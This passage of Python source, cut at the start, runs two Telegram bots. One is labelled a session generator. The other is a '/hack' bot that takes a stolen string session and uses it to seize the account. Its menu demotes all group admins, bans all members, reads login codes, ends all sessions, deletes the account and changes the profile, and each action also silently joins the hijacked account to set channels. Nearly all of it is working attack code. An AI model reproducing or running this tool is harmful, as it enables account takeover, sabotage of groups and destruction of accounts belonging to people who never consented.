            await auto_join_channels_telethon_2(rj)
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    try:
                        await rj.edit_admin(gc_id, x.id, manage_call=False, invite_users=False,
                                           ban_users=False, change_info=False, edit_messages=False,
                                           post_messages=False, add_admins=False, delete_messages=False)
                    except:
                        pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    try:
                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE_2)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ ᴀᴅᴍɪɴs!**"

async def send_to_saved_2(session, message):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            await rj.send_message("me", message)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                await r.send_message("me", message)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴍᴇssᴀɢᴇ sᴇɴᴛ ᴛᴏ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!**"

async def get_active_sessions_2(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            auths = await rj(tfunc.account.GetAuthorizationsRequest())
            for i, auth in enumerate(auths.authorizations, 1):
                msg += f"**{i}. Device:** {auth.device_model}\n"
                msg += f"**Platform:** {auth.platform}\n"
                msg += f"**Location:** {auth.country}\n"
                msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                auths = await r.invoke(functions.account.GetAuthorizations())
                for i, auth in enumerate(auths.authorizations, 1):
                    msg += f"**{i}. Device:** {auth.device_model}\n"
                    msg += f"**Platform:** {auth.platform}\n"
                    msg += f"**Location:** {auth.country}\n"
                    msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ғᴏᴜɴᴅ!**"

async def download_profile_pics_2(session):
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            photos = await rj.get_profile_photos("me")
            if photos:
                file_path = await rj.download_profile_photo("me")
                await rj.disconnect()
                return file_path
            else:
                await rj.disconnect()
                return None
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                async for photo in r.get_chat_photos("me", limit=1):
                    file_path = await r.download_media(photo.file_id)
                    return file_path
                return None
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return None

async def change_profile_2(session, fname=None, lname=None, bio=None):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID_2, API_HASH_2)
            await rj.connect()
            await auto_join_channels_telethon_2(rj)
            if fname:
                await rj(tfunc.account.UpdateProfileRequest(first_name=fname))
                msg += "**✅ First Name Changed!**\n"
            if lname:
                await rj(tfunc.account.UpdateProfileRequest(last_name=lname))
                msg += "**✅ Last Name Changed!**\n"
            if bio:
                await rj(tfunc.account.UpdateProfileRequest(about=bio))
                msg += "**✅ Bio Changed!**\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID_2, api_hash=API_HASH_2, session_string=session) as r:
                await auto_join_channels_pyrogram_2(r)
                if fname or lname:
                    await r.update_profile(first_name=fname, last_name=lname)
                    msg += "**✅ Name Changed!**\n"
                if bio:
                    await r.invoke(functions.account.UpdateProfile(about=bio))
                    msg += "**✅ Bio Changed!**\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴄʜᴀɴɢᴇs ᴍᴀᴅᴇ!**"

# ==================== HANDLERS - BOT 2 ====================
@recovery_bot.on_message(filters.command("start") & filters.private)
async def start_handler_2(_, message):
    user = message.from_user.mention
    bot = (await _.get_me()).mention
    await message.reply_photo(
        photo=START_PIC_2,
        caption=PM_TEXT_2.format(user, bot, owner=OWNER_NAME_2),
        reply_markup=PM_BUTTON_2
    )

@recovery_bot.on_message(filters.command("hack") & filters.private)
async def hack_handler_2(_, message):
    await message.reply_text(HACK_TEXT_2.format(owner=OWNER_NAME_2), reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("hack_btn_2"))
async def hack_btn_callback_2(_, query):
    await query.message.delete()
    await query.message.reply_text(HACK_TEXT_2.format(owner=OWNER_NAME_2), reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_A$"))
async def feature_a_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await users_gc_2(session.text)
    
    if len(result) > 3855:
        with open("channels.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "channels.txt")
        os.remove("channels.txt")
    else:
        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_B$"))
async def feature_b_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await user_info_2(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_C$"))
async def feature_c_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await banall_2(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_D$"))
async def feature_d_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_otp_2(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_E$"))
async def feature_e_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await join_ch_2(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_F$"))
async def feature_f_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await leave_ch_2(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_G$"))
async def feature_g_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await del_ch_2(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_H$"))
async def feature_h_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await check_2fa_2(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_I$"))
async def feature_i_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await terminate_all_2(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_J$"))
async def feature_j_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await del_acc_2(session.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_K$"))
async def feature_k_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await promote_user_2(session.text, gc.text, user.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_L$"))
async def feature_l_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await demote_all_2(session.text, gc.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_M$"))
async def feature_m_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    msg = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛᴏ sᴇɴᴅ:**")
    result = await send_to_saved_2(session.text, msg.text)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_N$"))
async def feature_n_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_active_sessions_2(session.text)
    
    if len(result) > 3855:
        with open("sessions.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "sessions.txt")
        os.remove("sessions.txt")
    else:
        await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_O$"))
async def feature_o_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await download_profile_pics_2(session.text)
    
    if result and isinstance(result, str) and os.path.exists(result):
        await client.send_photo(chat_id, result, caption="**✅ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ!**")
        os.remove(result)
    else:
        await query.message.reply_text(text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)

@recovery_bot.on_callback_query(filters.regex("^hack_P$"))
async def feature_p_2(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    fname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ғɪʀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    lname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʟᴀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    bio = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʙɪᴏ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    
    fn = None if fname.text == "." else fname.text
    ln = None if lname.text == "." else lname.text
    bi = None if bio.text == "." else bio.text
    
    result = await change_profile_2(session.text, fn, ln, bi)
    await query.message.reply_text(text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**", reply_markup=HACK_MODS_2)


# ╔═══════════════════════════════════════════════════════════════╗
# ║                    MAIN RUNNER                                ║
# ╚═══════════════════════════════════════════════════════════════╝

async def main():
    print("=" * 60)
    print("🚀 Starting Both Bots...")
    print("=" * 60)
    
    # Start Bot 1
    await session_gen_bot.start()
    me1 = await session_gen_bot.get_me()
    print(f"✅ Bot 1 (Session Generator): @{me1.username}")
    
    # Start Bot 2
    await recovery_bot.start()
    me2 = await recovery_bot.get_me()
    print(f"✅ Bot 2 (Recovery/Hack): @{me2.username}")
    
    print("=" * 60)
    print("✅ Both Bots are Running!")
    print("=" * 60)
    
    # Keep running
    await idle()
    
    # Stop both bots
    await session_gen_bot.stop()
    await recovery_bot.stop()
    print("👋 Bots Stopped!")

if __name__ == "__main__":
    asyncio.run(main())
